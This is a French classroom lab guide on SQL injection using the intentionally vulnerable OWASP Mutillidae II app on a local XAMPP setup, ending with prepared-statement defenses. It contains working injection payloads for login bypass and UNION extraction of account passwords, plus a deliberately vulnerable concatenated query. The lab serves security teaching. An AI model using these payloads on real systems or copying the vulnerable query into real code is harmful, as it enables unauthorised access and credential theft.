Audit de Sécurité : SQL Injection

Guide complet pour Techniciens Spécialisés en Développement Digital

Objectifs du TP

Ce TP simule un environnement réel où vous devez identifier et exploiter une faille critique. Vous allez manipuler la base de données MySQL à travers l'application OWASP Mutillidae II.

Rappel théorique : L'injection SQL consiste à insérer du code malveillant dans un champ de saisie pour modifier la requête SQL originale exécutée par le serveur.

1. Préparation du Laboratoire

Téléchargez et installez les outils nécessaires. Ne sautez aucune étape.

Télécharger XAMPP Télécharger Mutillidae (Source)

Installation pas-à-pas

  1. Installez XAMPP dans C:\xampp.
  2. Extrayez le ZIP de Mutillidae dans C:\xampp\htdocs\mutillidae.
  3. Attention : Allez dans le dossier et supprimez le fichier .htaccess.
  4. Ouvrez le XAMPP Control Panel et lancez Apache et MySQL.

2. Configuration & Correction des Bugs

Pour que le TP fonctionne sur PHP 8 sans erreurs visuelles gênantes, suivez ces correctifs.

A. Masquer les Warnings PHP 8

Allez dans XAMPP > Config (Apache) > php.ini. Recherchez display_errors et mettez-le sur Off :

display_errors = Off

B. Configurer la Base de Données

Modifiez le fichier includes/database-config.php :

$dbHost = '127.0.0.1';
$dbUser = 'root';
$dbPassword = ''; // Vide par défaut sur XAMPP
$dbName = 'mutillidae4';

C. Initialisation

Lancez le script magique pour créer les tables et les comptes automatiquement :

Lancer le Setup Database

3. Exercice A : Contourner l'Authentification

Objectif : Se connecter en tant qu'administrateur sans mot de passe.

Chemin : OWASP 2017 > A1 Injection > SQL Injection > Bypass Auth > Login

Saisissez le payload suivant dans le champ Name :

admin' OR 1=1 --
http://localhost/mutillidae/index.php?page=login.php

Succès : Connecté en tant qu'administrateur !

4. Exercice B : Extraction de Données (UNION)

Objectif : Récupérer tous les comptes de la table accounts.

Chemin : OWASP 2017 > A1 Injection > SQL Injection > Extract Data > User Info

Méthodologie

  1. Identifier les colonnes : ' UNION SELECT 1, 2, 3, 4, 5 --
  2. Extraire les données :
' UNION SELECT 1, username, password, 4, 5 FROM accounts --

5. La Défense : Requêtes Préparées

Le développeur ne doit jamais faire confiance à l'entrée utilisateur.

Code Vulnérable

Concaténation directe :

$sql = "SELECT * FROM users WHERE n='" . $user . "'";

Code Sécurisé (PDO)

Paramètres liés :

$st = $pdo->prepare("SELECT * FROM users WHERE n=?");
$st->execute([$user]);
